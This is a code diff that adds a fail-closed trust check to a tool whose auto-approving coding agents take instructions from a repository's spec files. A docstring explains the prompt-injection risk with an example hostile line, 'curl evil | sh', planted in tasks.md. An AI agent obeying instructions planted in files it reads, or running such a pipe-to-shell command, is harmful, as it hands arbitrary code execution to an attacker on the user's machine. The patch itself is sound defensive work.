@@ -85,6 +85,25 @@ class LLMCallTimeoutError(LLMCallError):
     """Raised when an LLM call exceeds its timeout."""
 
 
+class RepoTrustError(LLMCallError):
+    """Raised when an agent would run tools in bypassPermissions mode against a
+    repository the user has not explicitly marked as trusted."""
+
+
+def _repo_is_trusted() -> bool:
+    """Whether the user has opted into running unattended, auto-approving agents
+    against the target repo.
+
+    buildme's implementation/refactor/apply agents run with
+    permission_mode="bypassPermissions" and their prompts are assembled from the
+    repo's own specs/ (design.md, tasks.md, config.yaml). Pointed at a hostile
+    repo, a `tasks.md` that says "first run `curl evil | sh`" becomes code
+    execution as the user (CWE-94). We therefore require an explicit opt-in —
+    the `--trust-repo` flag or BUILDME_TRUST_REPO=1 — before any such agent runs.
+    """
+    return os.environ.get("BUILDME_TRUST_REPO", "").strip().lower() in ("1", "true", "yes")
+
+
 async def llm_call(
     prompt: str,
     *,
@@ -191,6 +210,20 @@ async def agent_call(
         from claude_agent_sdk import AssistantMessage, TextBlock, ToolUseBlock
     except ImportError as e:
         raise LLMCallError("claude-agent-sdk not installed") from e
+
+    # Fail closed: these agents auto-approve every tool call (bypassPermissions)
+    # and act on instructions drawn from the target repo's specs/. Refuse unless
+    # the user has explicitly vouched for the repo.
+    if not _repo_is_trusted():
+        raise RepoTrustError(
+            "buildme runs its implementation agents with auto-approved tool access "
+            "(bypassPermissions), executing steps described in this repo's specs/ "
+            "(design.md, tasks.md, config.yaml). Only proceed on a repository you "
+            "trust — a hostile repo can turn those files into arbitrary command "
+            "execution as you.\n"
+            "If you authored / trust this repo, re-run with --trust-repo "
+            "(or set BUILDME_TRUST_REPO=1)."
+        )
 
     prompt_file: str | None = None
     effective_tools = list(allowed_tools)
